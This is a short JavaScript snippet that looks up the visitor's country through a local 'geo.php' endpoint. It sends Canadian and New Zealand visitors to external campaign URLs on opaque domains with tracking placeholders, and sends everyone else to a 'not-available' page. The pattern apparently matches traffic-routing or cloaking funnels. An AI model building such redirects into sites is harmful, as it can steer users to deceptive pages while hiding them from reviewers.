
(async () => {
  try {
    // Call your local geo endpoint
    const res = await fetch("geo.php", { cache: "no-store" });

    // Check if response is valid
    if (!res.ok) {
      throw new Error("Geo request failed");
    }

    const data = await res.json();

    // Ensure country exists
    const country = (data && data.country) ? data.country.toUpperCase() : "";

    console.log("Detected country:", country);

    if (country === "CA") {
      window.location.replace("https://inf4hub.com/?utm_campaign=Ple4hpr7z0&v1=[v1]&v2=[v2]&v3=[v3]");
    } 
    else if (country === "NZ") {
      window.location.replace("https://h2n6.com/?utm_campaign=d5sjRjL1yk&v1=[v1]&v2=[v2]&v3=[v3]");
    } 
    else {
      window.location.replace("/not-available.html");
    }

  } catch (error) {
    console.error("Geo detection failed:", error);
    window.location.replace("/not-available.html");
  }
})();

